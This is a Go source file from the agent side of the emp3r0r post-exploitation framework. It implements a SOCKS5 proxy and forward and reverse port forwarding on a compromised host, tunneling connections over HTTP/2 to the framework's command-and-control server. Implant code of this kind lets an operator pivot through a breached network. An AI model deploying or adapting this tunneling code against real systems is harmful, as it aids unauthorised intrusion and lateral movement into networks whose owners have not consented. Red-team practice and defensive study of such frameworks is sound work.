package modules

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/posener/h2conn"
)

// PortFwdSession manage a port fwd session
type PortFwdSession struct {
	Addr   string // is a listener when `reverse` is set, a dialer when used normally
	Conn   *h2conn.Conn
	Ctx    context.Context
	Cancel context.CancelFunc
}

var (
	// PortFwds manage port mappings
	PortFwds = make(map[string]*PortFwdSession)

	// PortFwdsMutex lock map
	PortFwdsMutex = &sync.Mutex{}
)

// Socks5Proxy sock5 proxy server on agent, listening on addr
// op: on/off
func Socks5Proxy(op string, addr string) (err error) {
	// op
	switch op {
	case "on":
		logging.Printf("Starting Socks5Proxy %s", addr)
		def.ProxyDone = make(chan struct{})
		go func() {
			defer close(def.ProxyDone)
			err = transport.StartSocks5Proxy(addr, common.RuntimeConfig.DoHServer, def.ProxyServer, func(l net.Listener) {
				def.ProxyLock.Lock()
				def.ProxyListener = l
				def.ProxyLock.Unlock()
			})
			if err != nil {
				logging.Printf("StartSock5Proxy %s: %v", addr, err)
			}
		}()
	case "off":
		logging.Printf("Stopping Socks5Proxy %s", addr)
		if def.ProxyServer == nil {
			return errors.New("proxy server is not running")
		}
		def.ProxyLock.Lock()
		if def.ProxyListener != nil {
			def.ProxyListener.Close()
		}
		def.ProxyLock.Unlock()
		if def.ProxyDone != nil {
			<-def.ProxyDone
		}
		if err != nil {
			logging.Print(err)
		}
		def.ProxyServer = nil
	default:
		return errors.New("operation not supported")
	}

	return err
}

// PortFwd port mapping, receive request data then send it to target port on remote address
// addr: when reversed, addr should be port
func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err error) {
	var (
		session PortFwdSession

		url = fmt.Sprintf("%s/%s/%s",
			def.CCAddress,
			transport.PortMappingAPI,
			sessionID)

		// connection
		conn   *h2conn.Conn
		ctx    context.Context
		cancel context.CancelFunc
	)
	if !netutil.ValidateIPPort(addr) && !reverse {
		return fmt.Errorf("invalid address: %s", addr)
	}

	// connect via h2 to CC, or not
	ctx, cancel = context.WithCancel(context.Background())
	if reverse {
		logging.Printf("PortFwd (reversed) started: %s (%s)", addr, sessionID)
		go listenAndFwd(ctx, cancel, addr, sessionID) // here addr is a port number to listen on
	} else {
		conn, ctx, cancel, err = c2transport.EstablishC2Connection(url)
		if err != nil {
			return fmt.Errorf("failed to connect to CC: %v", err)
		}
		logging.Printf("PortFwd (%s) started: %s (%s)", protocol, addr, sessionID)
		go transport.FwdToDport(ctx, cancel, addr, sessionID, protocol, conn, timeout)
	}

	// remember to cleanup
	defer func() {
		cancel()
		if conn != nil {
			conn.Close()
		}

		PortFwdsMutex.Lock()
		delete(PortFwds, sessionID)
		PortFwdsMutex.Unlock()
		logging.Printf("PortFwd stopped: %s (%s)", addr, sessionID)
	}()

	// save this session
	session.Addr = addr
	session.Conn = conn
	session.Ctx = ctx
	session.Cancel = cancel
	PortFwdsMutex.Lock()
	PortFwds[sessionID] = &session
	PortFwdsMutex.Unlock()

	// check if h2conn is disconnected,
	// if yes, kill all goroutines and cleanup
	for ctx.Err() == nil {
		time.Sleep(100 * time.Millisecond)
	}
	return
}

// start a local listener on agent, forward connections to CC
func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
	port, sessionID string,
) {
	var err error

	// serve a TCP connection received on agent side
	serveConn := func(conn net.Conn) {
		// tell CC this is a reversed port mapping
		lport := strings.Split(conn.RemoteAddr().String(), ":")[1]
		shID := fmt.Sprintf("%s_%s-reverse", sessionID, lport)
		url := fmt.Sprintf("%s/%s/%s",
			def.CCAddress,
			transport.PortMappingAPI,
			shID)

		// start a h2 connection per incoming TCP connection
		h2, _, h2cancel, err := c2transport.EstablishC2Connection(url)
		if err != nil {
			logging.Printf("h2conn (%s) failed: %v", url, err)
			return
		}
		defer func() {
			if h2 != nil {
				_, _ = h2.Write([]byte("exit\n"))
				h2cancel()
			}
			conn.Close()
		}()

		// iocopy
		go func() {
			_, err = io.Copy(conn, h2)
			if err != nil {
				logging.Printf("h2 -> conn: %v", err)
			}
		}()
		go func() {
			_, err = io.Copy(h2, conn)
			if err != nil {
				logging.Printf("conn -> h2: %v", err)
			}
		}()

		for ctx.Err() == nil {
			time.Sleep(100 * time.Millisecond)
		}
	}

	// listen
	addr := "0.0.0.0:" + port
	l, err := net.Listen("tcp", addr)
	if err != nil {
		logging.Printf("listen on %s failed: %s", addr, err)
		cancel()
	}
	defer func() {
		if l != nil {
			l.Close()
		}
		cancel()
	}()

	// serve
	for ctx.Err() == nil {
		conn, err := l.Accept()
		if err != nil {
			logging.Printf("Listening on 0.0.0.0:%s: %v", port, err)
			continue
		}
		go serveConn(conn)
	}
}
